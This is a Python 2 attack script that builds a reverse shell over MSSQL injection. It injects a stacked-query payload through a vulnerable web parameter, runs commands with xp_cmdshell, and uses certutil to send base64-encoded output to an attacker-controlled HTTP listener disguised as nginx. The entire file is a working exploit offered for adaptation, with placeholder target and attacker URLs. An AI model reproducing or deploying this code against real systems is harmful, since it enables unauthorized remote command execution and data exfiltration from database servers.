import sys
import requests
import threading
import HTMLParser
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

'''
Description: Reverse MSSQL shell through xp_cmdshell + certutil for exfiltration
'''


query_id   = 0
target_url = "http://target/vulnerable.asp"
local_url  = "http://attacker/"
local_port = 80


'''
Decoding functions
'''
b64_padding = lambda x: x.ljust(len(x) + (4 - len(x) % 4), '=')

def base64_dec(x):
    try:
        res = b64_padding(x).decode('base64')
    except:
        # Command output got truncated
        if len(x)%4 > 0:
            x = x[:-(len(x)%4)]
        res = x.decode('base64')
    return res

def decode(data):
    parser = HTMLParser.HTMLParser()
    try:
        # We don't like Unicode strings, do we?
        html = base64_dec(data).replace(chr(0),'')
    except:
        return '[-] decoding error'
    return parser.unescape(html)


'''
Get command from stdin
'''
def get_command():
    try:
        cmd = raw_input(':\> ')
        t = threading.Thread(target=send_command, args=(cmd,))
        t.start()
    except:
        sys.exit(0)


'''
Create payload and send command: adapt this function to your needs
'''
def send_command(cmd):
    global target_url, local_url

    payload  = "';"
    payload += "declare @r varchar(4120),@cmdOutput varchar(4120);"
    payload += "declare @res TABLE(line varchar(max));"
    payload += "insert into @res exec xp_cmdshell '%s';"
    payload += "set @cmdOutput=(select (select cast((select line+char(10) COLLATE SQL_Latin1_General_CP1253_CI_AI as 'text()' from @res for xml path('')) as varbinary(max))) for xml path(''),binary base64);"
    payload += "set @r=concat('certutil -urlcache -f %s',@cmdOutput);"
    payload += "exec xp_cmdshell @r;"
    payload += "--"

    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
    h = {'User-Agent':user_agent}
    
    # Customize from here
    p = {
          'param1':'foo',
          'param2':'bar',
          'vulnerable_param':payload % (cmd, local_url)
        }

    requests.get(target_url, headers=h, params=p)



'''
Custom HTTPServer
'''
class MyServer(HTTPServer):
    def server_activate(self):
        # get first command
        get_command()
        HTTPServer.server_activate(self)

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def log_request(self, *args, **kwargs):
        return

    def log_message(self, *args, **kwargs):
        return

    def do_GET(self):
        global query_id
        self.send_error(404)
        
        # Certutil sends 2 requets each time
        if query_id % 2 == 0:
            output = self.path

            # if command output, decode it!
            if output != '/':
                print decode(output[1:])

            # get next command
            get_command()

        query_id += 1


'''
Main
'''
if __name__ == '__main__':
    # Fake server behaviour
    handler = SimpleHTTPRequestHandler
    handler.server_version = 'nginx'
    handler.sys_version = ''
    handler.error_message_format = 'not found'
    
    # Add SSL support if you wanna be a ninja!
    httpd = MyServer(('0.0.0.0', local_port), handler)
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()

